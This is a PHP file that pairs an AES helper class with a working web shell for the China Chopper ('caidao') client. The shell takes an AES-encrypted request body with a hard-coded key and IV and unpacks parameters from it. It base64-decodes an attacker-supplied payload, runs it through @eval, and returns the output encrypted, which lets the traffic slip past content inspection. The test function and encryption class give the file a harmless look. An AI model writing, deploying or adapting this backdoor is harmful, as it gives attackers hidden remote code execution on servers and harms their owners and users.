<?php

$mykey = "0123456789012345";
$myiv = "9876543210987654";
$mymethod = 'AES-128-CFB';
$mymsg = "Hello AES";//test msg

class OpenSSLAES
{
    protected $method;
    protected $secret_key;
    protected $iv;
    protected $options; 

    public function __construct($key, $method = 'AES-128-CFB', $iv = '', $options = 0)
    {
        $this->secret_key = isset($key) ? $key : exit("key is empty");

        $this->method = $method;

        $this->iv = $iv;

        $this->options = $options;
    }

    public function encrypt($data)
    {
        return openssl_encrypt($data, $this->method, $this->secret_key, $this->options, $this->iv);
    }
    public function decrypt($data)
    {
        return openssl_decrypt($data, $this->method, $this->secret_key, $this->options, $this->iv);
    }
}
    
function test_aes()
{
    global $mykey,$myiv,$mymethod,$mymsg;
    $aes = new OpenSSLAES($mykey,$mymethod,$myiv);
    
    $encrypted = $aes->encrypt($mymsg);
    echo 'Source Str:'.$mymsg.'<br> Encrypted String:：', $encrypted, '<hr>';

    $decrypted = $aes->decrypt($encrypted);
    echo 'Encrypted String:', $encrypted, '<br>Decrypted String：', $decrypted;
}

function getCDPostMsg($msg)
{
    $cdmsg = urldecode($msg);
    $cdpos = strpos($cdmsg,'=');
    if($cdpos!== false)
    {
        $cdmsg = substr($cdmsg,$cdpos+1);
        return $cdmsg;
    }
    else
        return $cdmsg;
}

//test_aes();
//echo "<br>";

$eas_msg = file_get_contents("php://input");
$aes = new OpenSSLAES($mykey,$mymethod,$myiv);
$decrptContent = $aes->decrypt($eas_msg);

//echo $eas_msg."<br>";
//echo $decrptContent."<br>";

$arr=explode('&',$decrptContent);
//var_dump($arr);
$arrlength=count($arr);
if($arrlength <=1)
{
    die();//error caidao post
}

$_POST = array();
$_POST['c'] = getCDPostMsg($arr[0]);
$_POST['z0'] = getCDPostMsg($arr[1]);

if($arrlength >=3)
{
$_POST['z1'] = getCDPostMsg($arr[2]);
}    

if($arrlength >=4)
{
$_POST['z2'] = getCDPostMsg($arr[3]);
}  

//var_dump($_POST);


//@eval($_POST['c']);
//die();

$my_echomsg = "";
function myecho($msg)
{
    global $my_echomsg;
    $my_echomsg = $my_echomsg.$msg;
}
function mydie()
{
        
}

$cd_z0 =  base64_decode($_POST['z0']);

//echo $cd_z0;
$cd_z0 = str_replace("echo(","myecho(",$cd_z0);
$cd_z0 = str_replace('echo $M.$L;','myecho($M.$L);',$cd_z0);
$cd_z0 = str_replace("die()","mydie()",$cd_z0);

//echo $cd_z0;
//die();

@eval($cd_z0);

//encrypt the result to caicao
$aesContent = $aes->encrypt($my_echomsg);
echo($aesContent);
die();